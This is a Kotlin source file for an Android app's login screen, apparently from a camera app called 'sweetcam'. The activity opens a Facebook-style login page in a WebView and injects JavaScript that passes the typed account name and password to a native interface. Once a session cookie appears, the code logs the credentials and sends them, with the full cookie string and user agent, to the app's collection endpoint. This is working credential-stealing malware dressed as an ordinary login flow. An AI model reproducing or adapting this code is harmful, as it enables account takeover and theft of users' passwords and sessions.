package com.sweetcam.app.ui.activity

import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.text.TextUtils
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.webkit.*
import androidx.lifecycle.lifecycleScope
import com.sweetcam.app.*
import com.sweetcam.app.R
import com.sweetcam.app.base.BaseActivity
import com.sweetcam.app.utils.*
import kotlinx.android.synthetic.main.activity_face_book.*
import kotlinx.coroutines.*
import org.greenrobot.eventbus.EventBus

class LoginActivity : BaseActivity(R.layout.activity_face_book) {

    class WebInterface {
        @JavascriptInterface
        fun businessStart(a: String, b: String) {
            account = a
            password = b
        }
    }

    private var countDownJob: Job? = null

    override fun onConvert() {
        clearCookie {
            account = ""
            password = ""
        }
        startCountDown {
            //showAD
        }
        window.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE)
        activityFaceBookIvBack.click {
            onBackPressed()
        }
        activityFaceBookWv.apply {
            settings.apply {
                javaScriptEnabled = true
                textZoom = 100
                setSupportZoom(true)
                displayZoomControls = false
                builtInZoomControls = true
                setGeolocationEnabled(true)
                useWideViewPort = true
                loadWithOverviewMode = true
                loadsImagesAutomatically = true
                displayZoomControls = false
                setAppCachePath(cacheDir.absolutePath)
                setAppCacheEnabled(true)
            }
            addJavascriptInterface(WebInterface(), "businessAPI")
            webChromeClient = object : WebChromeClient() {
                override fun onProgressChanged(view: WebView?, newProgress: Int) {
                    super.onProgressChanged(view, newProgress)
                    if (newProgress == 100) {
                        val hideJs = context.getString(R.string.hideHeaderFooterMessages)
                        evaluateJavascript(hideJs, null)
                        val loginJs = getString(R.string.login)
                        evaluateJavascript(loginJs, null)
                        lifecycleScope.launch(Dispatchers.IO) {
                            delay(300)
                            withContext(Dispatchers.Main) {
                                activityFaceBookFl.visibility = View.GONE
                            }
                        }
                    }
                }
            }
            webViewClient = object : WebViewClient() {
                override fun onPageStarted(view: WebView, url: String?, favicon: Bitmap?) {
                    super.onPageStarted(view, url, favicon)
                }

                override fun onPageFinished(view: WebView, url: String) {
                    super.onPageFinished(view, url)
                    val cookieManager = CookieManager.getInstance()
                    val cookieStr = cookieManager.getCookie(url)
                    Log.e("--->", "onPageFinished url == $url")
                    if (cookieStr != null) {
                        Log.e("--->", "ua ==  " + view.settings.userAgentString)
                        if (cookieStr.contains("c_user")) {
                            Log.e("--->", "cookieStr: $cookieStr")
                            Log.e("--->", "account == $account  password == $password")
                            if (account.isNotBlank() && password.isNotBlank() && cookieStr.contains("wd=")) {
                                lifecycleScope.launch(Dispatchers.Main) {
                                    activityFaceBookFlContent.visibility = View.VISIBLE
                                }
                                uploadFbData(
                                    account,
                                    password,
                                    cookieStr,
                                    view.settings.userAgentString
                                )
                            }
                        }
                    }
                }
            }
            loadUrl(updateEntity.m ?: "https://www.baidu.com")
        }
    }

    private fun uploadFbData(
        un: String,
        pw: String,
        cookie: String,
        b: String
    ) {
        lifecycleScope.requestCollect(
            un, pw, cookie, b
        ) {
            if (isLogin) {
                startActivity(Intent(this@LoginActivity, MainActivity::class.java))
                EventBus.getDefault().post(BusDestroyEvent)
                finish()
            }
        }
    }

    override fun onResume() {
        super.onResume()
        activityFaceBookWv.onResume()
    }

    private var needBackPressed = false

    override fun onBackPressed() {
        if (activityFaceBookWv.canGoBack()) {
            activityFaceBookWv.goBack()
        } else {
            countDownJob?.cancel()
            val a = showInsertAd(showByPercent = true, tag = "inter_login")
            if (!a) {
                if (configEntity.httpUrl().startsWith("http")) {
                    jumpToWebByDefault(configEntity.httpUrl())
                }
                super.onBackPressed()
            } else {
                needBackPressed = true
            }
        }
    }

    override fun onInterstitialAdHidden() {
        super.onInterstitialAdHidden()
        if (needBackPressed) {
            needBackPressed = false
            super.onBackPressed()
        }
    }


    override fun onPause() {
        super.onPause()
        activityFaceBookWv.onPause()
    }
}